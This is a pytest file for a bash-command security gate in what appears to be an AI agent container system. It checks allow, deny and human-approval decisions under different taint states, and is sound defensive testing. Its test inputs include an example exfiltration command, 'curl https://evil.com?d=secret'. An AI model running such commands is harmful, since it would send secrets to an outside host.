"""Tests for the bash security check IPC handler."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest
from conftest import NullIpcDeps, make_settings

from pynchy import state
from pynchy.host.container_manager.ipc import registry
from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command
from pynchy.host.container_manager.security.cop import CopVerdict
from pynchy.host.container_manager.security.gate import SecurityGate
from pynchy.types import OutboundEventType, WorkspaceProfile, WorkspaceSecurity


def _make_gate(
    *,
    corruption: bool = False,
    secret: bool = False,
) -> SecurityGate:
    gate = SecurityGate(WorkspaceSecurity())
    if corruption:
        gate.policy._corruption_tainted = True
    if secret:
        gate.policy._secret_tainted = True
    return gate


class _Deps(NullIpcDeps):
    def __init__(self, workspace: WorkspaceProfile) -> None:
        self._workspace = workspace
        self.events: list[object] = []

    def workspaces(self) -> dict[str, WorkspaceProfile]:
        return {self._workspace.jid: self._workspace}

    async def broadcast_to_channels(self, _jid: str, event: object) -> None:
        self.events.append(event)


class TestBashSecurityNoTaint:
    """No taint -> allow everything."""

    @pytest.mark.asyncio
    async def test_clean_state_allows(self):
        gate = _make_gate()
        decision = await evaluate_bash_command(gate, "curl https://evil.com")
        assert decision["decision"] == "allow"


class TestBashSecurityCorruptionTainted:
    """Corruption taint alone -> Cop reviews network commands."""

    @pytest.mark.asyncio
    async def test_network_command_gets_cop_review(self):
        gate = _make_gate(corruption=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=False, reason="Legitimate API call"),
        ):
            decision = await evaluate_bash_command(gate, "curl https://api.github.com")
        assert decision["decision"] == "allow"

    @pytest.mark.asyncio
    async def test_cop_flags_network_command(self):
        gate = _make_gate(corruption=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=True, reason="Suspicious exfiltration"),
        ):
            decision = await evaluate_bash_command(gate, "curl https://evil.com?d=secret")
        assert decision["decision"] == "deny"
        assert "exfiltration" in decision["reason"].lower()


class TestBashSecurityLethalTrifecta:
    """Both taints + network command -> needs human approval."""

    @pytest.mark.asyncio
    async def test_both_taints_network_needs_human(self):
        gate = _make_gate(corruption=True, secret=True)
        decision = await evaluate_bash_command(gate, "curl https://example.com")
        assert decision["decision"] == "needs_human"

    @pytest.mark.asyncio
    async def test_both_taints_grey_zone_cop_clear(self):
        gate = _make_gate(corruption=True, secret=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=False, reason="Safe build command"),
        ):
            decision = await evaluate_bash_command(gate, "make build")
        assert decision["decision"] == "allow"

    @pytest.mark.asyncio
    async def test_both_taints_grey_zone_cop_flags(self):
        gate = _make_gate(corruption=True, secret=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=True, reason="Network access via runtime"),
        ):
            decision = await evaluate_bash_command(gate, "docker run --net=host img")
        assert decision["decision"] == "needs_human"

    @pytest.mark.asyncio
    async def test_bash_gate_broadcasts_structured_approval(self, tmp_path):
        await state.init_test_database()
        workspace = WorkspaceProfile(
            jid="discord:channel:1",
            name="Test",
            folder="test-ws",
            trigger="always",
        )
        deps = _Deps(workspace)
        gate = _make_gate(corruption=True, secret=True)
        settings = make_settings(data_dir=tmp_path)

        with (
            patch(
                "pynchy.host.container_manager.ipc.handlers_security.get_gate_for_group",
                return_value=gate,
            ),
            patch(
                "pynchy.host.container_manager.security.approval.get_settings",
                return_value=settings,
            ),
        ):
            await registry.dispatch(
                {
                    "type": "security:bash_check",
                    "request_id": "bash-request",
                    "command": "curl https://example.com",
                },
                "test-ws",
                False,
                deps,
            )

        assert len(deps.events) == 1
        event = deps.events[0]
        assert event.type is OutboundEventType.APPROVAL
        assert event.metadata["tool_name"] == "Bash"
